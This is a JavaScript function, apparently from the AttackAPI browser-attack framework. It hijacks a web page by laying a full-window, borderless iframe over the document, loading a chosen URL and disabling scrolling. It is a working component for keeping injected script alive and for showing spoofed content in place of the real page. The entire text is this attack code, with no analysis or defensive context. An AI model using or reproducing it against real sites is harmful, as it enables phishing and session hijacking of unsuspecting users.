
AttackAPI.dom.hijackView = function (obj) {
	var doc = obj.document?obj.document:AttackAPI.dom.getDocument();
	
	var ifr = doc.createElement('iframe');
	ifr.onload = obj.onload;
	ifr.src = obj.url?obj.url:doc.location;
	
	doc.body.scroll = 'no';
	doc.body.appendChild(ifr);
	
	ifr.style.position = 'absolute';
	ifr.style.width = ifr.style.height = '100%';
	ifr.style.top = ifr.style.left = ifr.style.border = 0;
	ifr.style.background = '#FFFFFF';
	
	ifr.focus();
	
	return ifr;
};